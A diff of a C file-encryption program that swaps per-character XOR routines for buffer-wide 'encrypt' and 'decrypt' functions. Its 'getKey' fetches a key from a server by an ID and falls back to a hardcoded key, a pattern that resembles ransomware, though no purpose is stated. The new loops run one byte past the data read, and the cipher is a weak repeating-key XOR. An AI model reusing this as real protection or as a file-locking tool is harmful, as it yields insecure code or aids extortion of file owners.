@@ -41,17 +41,32 @@ char* remext(const char* input){
 	return output;
 }
 
-int docrypt(FILE* in, FILE* out, const char* key, char (*cyph)(char, const char*,int*)){
+int encrypt(int n, char line[n], const char* key, int* k) {
+	int len_key = strlen(key);
+	for(int i = 0; i <= n; i++) {
+		line[i] = line[i]^(key[*k%len_key]-1);
+		line[i] += 1;
+		*k+=1;
+	}
+	return 0;
+}
+
+int decrypt(int n, char line[n], const char* key, int* k) {
+	int len_key = strlen(key);
+	for(int i = 0; i <= n; i++) {
+		line[i] -= 1;
+		line[i] = line[i]^(key[*k%len_key]-1);
+		*k+=1;
+	}
+	return 0;
+}
+
+int docrypt(FILE* in, FILE* out, const char* key, int (*cyph)(int, char[], const char*,int*)){
 	char* line = malloc(MAX+1);
 	int k = 0, bytes;
 	while((bytes = fread(line,1,MAX-1,in))>0){
-		line[MAX] = '\0';
-		int i = 0;
-		while(line[i]!='\0'){ // for each char in the line
-			line[i] = cyph(line[i], key, &k);
-			i++;
-		}
-		fwrite(line,1,bytes,out);
+		cyph(bytes, line, key, &k);
+		fwrite(line, 1, bytes, out);
 	}
 	free(line);
 	return 0;
@@ -63,32 +78,11 @@ char* getKey(int tmp_ID){
 	}
 	char* key = net_get(&ID);
 	if(!key) {
+		printf("unable to get the key online...\n");
 		key = malloc(LENGTH);
 		snprintf(key, LENGTH,"q}}c),apx?ic*n}zy{,uv)),$pfhjx:]zi{ws{j;gsjcem)]:ho{,~?_@+kiirda$e]r@;[?@;md^ib@wta[dl}c[hkc}rc{wa=vim-;^kkq^mxn-xkaahh-sqa~dhpz:)ppj=^c}h^wzogxdq$;{cg+zld[ssw[pji-^?,[m{=ei[)q+})ke;)$u@^?zt-m{mj^xtsb~,i})gsm;~yl^^?p^-w~q^$r;ik)a{evanr-z;+_^jkvdvf$z)+nw=-c*;_*fcpitgm~=$=kf}-grh?;f^w)l^_g@dh;,*q{b}luz-e@$glqop[x=tu^kz_+]kye?m_l;k-f;bf::+^[ey+x=h+^-sl^{b$br-m];+)wwgc{v]]}p;sdv?_szj+t~=^ami][}}trdvs{tm):^~jnw;eqrria_ggp~@imbacfwu,:_c~zx^i~bmaz)=^budx:he^;f[q^nw,p*u:qrp?zak=d^kfln-tucka?iqdwkh?k@r$xg,ng+_igjry$~=tx}t@?;c@z=,bs${:a?^lvzu_?jw?[d^u,puj}wiv:sw[rx?r*dcv]wtf_;=}~gp^$edz)pl,:ae^x;~xlqjjk}sijak)l@yk:)b,or+vrrsm-bh=rp{*r+j$u^)-^u;@q=id_z{wo=bm+n-,{$,=ito{mk_;dm:^[x@^n*s]i^k{f;aad,tp}@q;~~wy@c+[z=ye=;cyaqsf-zi?a*x}agjv$_k_a)}zlt_^abu?yk=vb{]czv-{_op[m$)m^]:;og?sm-{d;j*+?wpcitd;@tgpsea+):*~=gg-fcaqp{_$xubfmemp$yar_aaboaw@g$)+b-,x_ep[{q}:[ozui{?:cko+kc=xblih=o{rxrprhn)@_[^:xduznak*h^x::_t$q+qg,a{mo[pmt;^o~li*lt{y~r)*wwxg;mmomo))go=)$?kjptk@?gx[{^wrr~z]$:hhvff@xz}p{:]r]fx,+q)kos*_cz^bff:}:q{c:[s;?q[f[~;:@lr}");
 	}
-	/*
-	// online stuff
-	char* key = net_get(&ID) ?
-	//if network on
-	:
-	// if network off
-	"q}}c),apx?ic*n}zy{,uv)),$pfhjx:]zi{ws{j;gsjcem)]:ho{,~?_@+kiirda$e]r@;[?@;md^ib@wta[dl}c[hkc}rc{wa=vim-;^kkq^mxn-xkaahh-sqa~dhpz:)ppj=^c}h^wzogxdq$;{cg+zld[ssw[pji-^?,[m{=ei[)q+})ke;)$u@^?zt-m{mj^xtsb~,i})gsm;~yl^^?p^-w~q^$r;ik)a{evanr-z;+_^jkvdvf$z)+nw=-c*;_*fcpitgm~=$=kf}-grh?;f^w)l^_g@dh;,*q{b}luz-e@$glqop[x=tu^kz_+]kye?m_l;k-f;bf::+^[ey+x=h+^-sl^{b$br-m];+)wwgc{v]]}p;sdv?_szj+t~=^ami][}}trdvs{tm):^~jnw;eqrria_ggp~@imbacfwu,:_c~zx^i~bmaz)=^budx:he^;f[q^nw,p*u:qrp?zak=d^kfln-tucka?iqdwkh?k@r$xg,ng+_igjry$~=tx}t@?;c@z=,bs${:a?^lvzu_?jw?[d^u,puj}wiv:sw[rx?r*dcv]wtf_;=}~gp^$edz)pl,:ae^x;~xlqjjk}sijak)l@yk:)b,or+vrrsm-bh=rp{*r+j$u^)-^u;@q=id_z{wo=bm+n-,{$,=ito{mk_;dm:^[x@^n*s]i^k{f;aad,tp}@q;~~wy@c+[z=ye=;cyaqsf-zi?a*x}agjv$_k_a)}zlt_^abu?yk=vb{]czv-{_op[m$)m^]:;og?sm-{d;j*+?wpcitd;@tgpsea+):*~=gg-fcaqp{_$xubfmemp$yar_aaboaw@g$)+b-,x_ep[{q}:[ozui{?:cko+kc=xblih=o{rxrprhn)@_[^:xduznak*h^x::_t$q+qg,a{mo[pmt;^o~li*lt{y~r)*wwxg;mmomo))go=)$?kjptk@?gx[{^wrr~z]$:hhvff@xz}p{:]r]fx,+q)kos*_cz^bff:}:q{c:[s;?q[f[~;:@lrn}";
-	 */
 	return key;
-}
-
-char enc(char c, const char* key, int* i){
-	char buff = c^(key[*i%strlen(key)]-1);
-	buff += 1;
-	*i+=1;
-	return buff;
-}
-
-char dec(char c, const char* key, int* i){
-	char buff = c-1;
-	buff ^= key[*i%strlen(key)]-1;
-	*i+=1;
-	return buff;
 }
 
 int processFile(char* path, const char* key){
@@ -104,7 +98,7 @@ int processFile(char* path, const char* key){
 	}
 	free(outputPath);
 
-	char (*cypher[])(char, const char*,int*) = {enc, dec};
+	int (*cypher[])(int, char[], const char*,int*) = {encrypt, decrypt};
 	docrypt(input, output, key, cypher[todo]);
 
 	closeFile(input,output);
